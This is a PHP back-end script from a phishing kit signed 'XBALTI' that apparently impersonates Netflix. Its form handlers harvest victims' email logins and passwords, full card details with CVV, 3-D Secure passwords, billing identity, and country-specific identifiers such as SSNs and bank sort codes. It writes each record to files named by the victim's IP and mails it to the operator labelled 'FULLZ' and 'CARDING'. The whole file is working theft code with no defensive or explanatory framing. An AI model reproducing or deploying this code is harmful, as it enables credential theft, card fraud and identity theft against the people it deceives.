<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
error_reporting(0);
date_default_timezone_set('GMT');
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');
function XB_OS($USER_AGENT){
	$OS_ERROR    =   "Unknown OS Platform";
    $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
	                '/windows nt 6.3/i'     =>  'Windows 8.1',
	                '/windows nt 6.2/i'     =>  'Windows 8',
	                '/windows nt 6.1/i'     =>  'Windows 7',
	                '/windows nt 6.0/i'     =>  'Windows Vista',
	                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                '/windows nt 5.1/i'     =>  'Windows XP',
	                '/windows xp/i'         =>  'Windows XP',
	                '/windows nt 5.0/i'     =>  'Windows 2000',
	                '/windows me/i'         =>  'Windows ME',
	                '/win98/i'              =>  'Windows 98',
	                '/win95/i'              =>  'Windows 95',
	                '/win16/i'              =>  'Windows 3.11',
	                '/macintosh|mac os x/i' =>  'Mac OS X',
	                '/mac_powerpc/i'        =>  'Mac OS 9',
	                '/linux/i'              =>  'Linux',
	                '/ubuntu/i'             =>  'Ubuntu',
	                '/iphone/i'             =>  'iPhone',
	                '/ipod/i'               =>  'iPod',
	                '/ipad/i'               =>  'iPad',
	                '/android/i'            =>  'Android',
	                '/blackberry/i'         =>  'BlackBerry',
	                '/webos/i'              =>  'Mobile');
    foreach ($OS as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }

    }   
    return $OS_ERROR;
}
function XB_Browser($USER_AGENT){
	$BROWSER_ERROR    =   "Unknown Browser";
    $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($BROWSER as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
$_SESSION['XB'] = "XBALTI_NETFLIX";
if(isset($_POST['email']) && isset($_POST['password'])){	
	if(!empty($_POST['email']) && !empty($_POST['password'])){
$_SESSION['email']   = $_POST['email'];
$_SESSION['password']    = $_POST['password'];
$XBALTI_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Email ] = <font style='color:#ba0000;'>".$_SESSION['email']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
$admin .= "<html><body><div style='font-family:calibri;font-size:18px;font-weight:bold;margin:0 auto;border:2px solid #ddd;border-bottom:1px solid #ddd;box-sizing: border-box;width: 100%;max-width: 500px;'>
		<form method=post><p style='text-align: center;'><a target='_blank' style='text-decoration:none;' href='".$_SESSION['_ip_'].".php'>".$_SESSION['_ip_'].".php</a></p></form></div>";
    $khraha1 = fopen("../my/index.php", "a");
	fwrite($khraha1, $admin);
    $khraha = fopen("../my/".$_SESSION['_ip_'].".php", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "LOGIN 😈 INFO FROM 😈 [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: <".$_SESSION['XB'].">";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
if(isset($_POST['FullName']) && isset($_POST['AddressLine']) && isset($_POST['City']) && isset($_POST['State']) && isset($_POST['ZipCode']) && isset($_POST['PhoneNumber']) && isset($_POST['Birthdate'])){	
	if(!empty($_POST['FullName']) && !empty($_POST['AddressLine']) && !empty($_POST['City']) && !empty($_POST['State']) && !empty($_POST['ZipCode']) && !empty($_POST['PhoneNumber']) && !empty($_POST['Birthdate'])){
$_SESSION['FullName']        = $_POST['FullName'];
$_SESSION['AddressLine']        = $_POST['AddressLine'];
$_SESSION['City']    = $_POST['City'];
$_SESSION['State']        = $_POST['State'];
$_SESSION['ZipCode']    = $_POST['ZipCode'];
$_SESSION['PhoneNumber']        = $_POST['PhoneNumber'];
$_SESSION['Birthdate']        = $_POST['Birthdate'];
$XBALTI_MESSAGE .= "
<html>
<head>
<meta charset='UTF-8'>
<div  style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Email ] = <font style='color:#ba0000;'>".$_SESSION['email']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>CARDING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Name On Card ] = <font style='color:#ba0000;'>".$_SESSION['NameOnCard']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD NUMBER ] = <font style='color:#ba0000;'>".$_SESSION['cardNumber']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Date EX ]       = <font style='color:#ba0000;'>".$_SESSION['ExpirationDate']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV ]= <font style='color:#ba0000;'>".$_SESSION['SecurityCode']."</font><br>
================( <font style='color: #0a5d00;'>BILLING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [FULL NAME ] = <font style='color:#ba0000;'>".$_SESSION['FullName']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Adress Line ]        = <font style='color:#ba0000;'>".$_SESSION['AddressLine']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [City ]         = <font style='color:#ba0000;'>".$_SESSION['City']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [State ]      = <font style='color:#ba0000;'>".$_SESSION['State']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Zip code ]              = <font style='color:#ba0000;'>".$_SESSION['ZipCode']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Phone Number]             = <font style='color:#ba0000;'>".$_SESSION['PhoneNumber']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Date Of birth ]        = <font style='color:#ba0000;'>".$_SESSION['Birthdate']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
    $khraha = fopen("../my/".$_SESSION['_ip_'].".php", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "FULLZ 😈 INFO FROM 😈 [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: <".$_SESSION['XB'].">";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}

if(isset($_POST['NameOnCard']) && isset($_POST['cardNumber']) && isset($_POST['ExpirationDate']) && isset($_POST['SecurityCode'])){	
	if(!empty($_POST['NameOnCard']) && !empty($_POST['cardNumber']) && !empty($_POST['ExpirationDate']) && !empty($_POST['SecurityCode'])){
$_SESSION['NameOnCard']        = $_POST['NameOnCard'];
$_SESSION['cardNumber']    = $_POST['cardNumber'];
$_SESSION['ExpirationDate']        = $_POST['ExpirationDate'];
$_SESSION['SecurityCode']    = $_POST['SecurityCode'];
$_SESSION['cardtype']    = $_POST['cardtype'];
$XBALTI_MESSAGE .= "
<html>
<head>
<meta charset='UTF-8'>
<div  style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Email ] = <font style='color:#ba0000;'>".$_SESSION['email']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>CARDING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Name On Card ] = <font style='color:#ba0000;'>".$_SESSION['NameOnCard']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD NUMBER ] = <font style='color:#ba0000;'>".$_SESSION['cardNumber']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Date EX ]       = <font style='color:#ba0000;'>".$_SESSION['ExpirationDate']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV ]= <font style='color:#ba0000;'>".$_SESSION['SecurityCode']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
    $khraha = fopen("../my/".$_SESSION['_ip_'].".php", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "[".$_SESSION['cardtype']."] 😈 INFO FROM 😈 [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: <".$_SESSION['XB'].">";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}

if(isset($_POST['password_vbv'])){	
	if(!empty($_POST['password_vbv'])){
$_SESSION['codicefiscale']   = $_POST['codicefiscale'];
$_SESSION['kontonummer']   = $_POST['kontonummer'];
$_SESSION['offid']   = $_POST['offid'];
$_SESSION['osid']   = $_POST['osid'];
$_SESSION['password_vbv']   = $_POST['password_vbv'];
$_SESSION['sortcode']   = $_POST['sortcode'];
$_SESSION['ssn']   = $_POST['ssn'];
$XBALTI_MESSAGE .= "
<html>
<head>
<meta charset='UTF-8'>
<div  style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Email ] = <font style='color:#ba0000;'>".$_SESSION['email']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>CARDING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Name On Card ] = <font style='color:#ba0000;'>".$_SESSION['NameOnCard']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD NUMBER ] = <font style='color:#ba0000;'>".$_SESSION['cardNumber']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Date EX ]       = <font style='color:#ba0000;'>".$_SESSION['ExpirationDate']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV ]= <font style='color:#ba0000;'>".$_SESSION['SecurityCode']."</font><br>
================( <font style='color: #0a5d00;'>VBV INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Password]= <font style='color:#ba0000;'>".$_SESSION['password_vbv']."</font><br>\n";
if($_SESSION['countryCode'] == "IT"){
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [codicefiscale]= <font style='color:#ba0000;'>".$_SESSION['codicefiscale']."</font><br>\n";  
}
elseif($_SESSION['countryCode'] == "CH" || $_SESSION['countryCode'] == "DE") {	
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [kontonummer]= <font style='color:#ba0000;'>".$_SESSION['kontonummer']."</font><br>\n";  
}
elseif($_SESSION['countryCode'] == "GR") {	
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [offid]= <font style='color:#ba0000;'>".$_SESSION['offid']."</font><br>\n"; 
}
elseif($_SESSION['countryCode'] == "AU") {
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [osid]= <font style='color:#ba0000;'>".$_SESSION['osid']."</font><br>\n"; 
}
elseif ($_SESSION['countryCode'] == "IE" || $_SESSION['countryCode'] == "GB" ) {
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [sortcode]= <font style='color:#ba0000;'>".$_SESSION['sortcode']."</font><br>\n"; 
}
elseif ($_SESSION['countryCode'] == "US" ) {
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [ssn]= <font style='color:#ba0000;'>".$_SESSION['ssn']."</font><br>\n"; 
}
$XBALTI_MESSAGE .= "
================( <font style='color: #0a5d00;'>BILLING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [FULL NAME ] = <font style='color:#ba0000;'>".$_SESSION['FullName']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Adress Line ]        = <font style='color:#ba0000;'>".$_SESSION['AddressLine']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [City ]         = <font style='color:#ba0000;'>".$_SESSION['City']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [State ]      = <font style='color:#ba0000;'>".$_SESSION['State']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Zip code ]              = <font style='color:#ba0000;'>".$_SESSION['ZipCode']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Phone Number]             = <font style='color:#ba0000;'>".$_SESSION['PhoneNumber']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Date Of birth ]        = <font style='color:#ba0000;'>".$_SESSION['Birthdate']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
    $khraha = fopen("../my/".$_SESSION['_ip_'].".php", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
$XBALTI_SUBJECT .= "VBV 😈 [".$_SESSION['bankname']."] 😈 [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: <".$_SESSION['XB'].">";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}

?>
